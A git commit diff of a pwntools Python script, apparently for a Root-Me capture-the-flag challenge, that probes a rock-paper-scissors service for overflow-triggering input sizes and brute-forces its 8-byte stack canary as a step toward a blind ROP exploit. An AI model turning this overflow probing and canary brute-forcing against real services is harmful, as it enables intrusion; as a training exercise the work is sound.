646d686637969a0c11a9612440f79554be6b4992
charlierootme <alt.xm-0op50mpq@monmail.fr.nf>
2017-05-21 22:00:21 +0200

    cookie bruteforce

--- brop.py
+++ brop.py
@@ -1,8 +1,12 @@
 from pwn import *
 import random
+import itertools
 
 chal_url = "challenge03.root-me.org"
 chal_port= 56543
+
+def chal_con():
+	return remote(chal_url, chal_port)
 
 def input_generator(size):
 	def input_gen():
@@ -13,8 +17,8 @@ def player_input_generator():
 	return random.choice("rock/paper/scissors".split("/"))
 
 def play(input_gen_func = player_input_generator, display = False):
-	r = remote(chal_url, chal_port)
-	ret_progress=0
+	r = chal_con()
+	ret_progress = 0
 	try:
 		while True:
 			rl = r.readuntil(":")
@@ -33,19 +37,49 @@ def play(input_gen_func = player_input_generator, display = False):
 		pass
 	r.close()
 	return ret_progress
-	
-count = play(display=True)
-new_count = count
-size = 5
-print 'count =',count,'size = ',size
-while count == new_count:
-	new_count = play(display=False, input_gen_func = input_generator(size))
-	size +=1
-count = new_count
-print 'count =',count,'size = ',size
 
-while count == new_count:
-	new_count = play(display=False, input_gen_func = input_generator(size))
-	size +=1
-count = new_count
-print 'count =',count,'size = ',size
+def determine_interesting_input_sizes():
+	ret = {}
+	count = play(display=True)
+	new_count = count
+
+	size = 5
+	print 'count =',count,'size = ',size
+	ret[count] = size
+	while count == new_count:
+		new_count = play(display=False, input_gen_func = input_generator(size))
+		size +=1
+	count = new_count
+	print 'count =',count,'size = ',size
+	ret[count] = size
+	
+	size = 290
+	print 'count =',count,'size = ',size
+	while count == new_count:
+		new_count = play(display=False, input_gen_func = input_generator(size))
+		size +=1
+	count = new_count
+	print 'count =',count,'size = ',size
+	ret[count] = size
+	return ret
+	
+#~ dic = determine_interesting_input_sizes()
+dic = {0: 514, 1: 34, 2: 5}
+#~ print dic
+
+
+
+#~ print play(display = False, input_gen_func = lambda : "A"*32)
+
+#~ print play(display = False, input_gen_func = lambda : "A"*33)
+
+byte_values = [chr(i) for i in range(0x100)]
+for guess_cookie in itertools.product(byte_values,repeat = 8):
+	string_test = "{}{}".format("A"*32,''.join(guess_cookie))
+	if 1 != play(display = False, input_gen_func = lambda : string_test):
+		print "ohh yeah",string_test
+		open("/tmp/test.result",'w').write(string_test)
+		break;
+
+
+
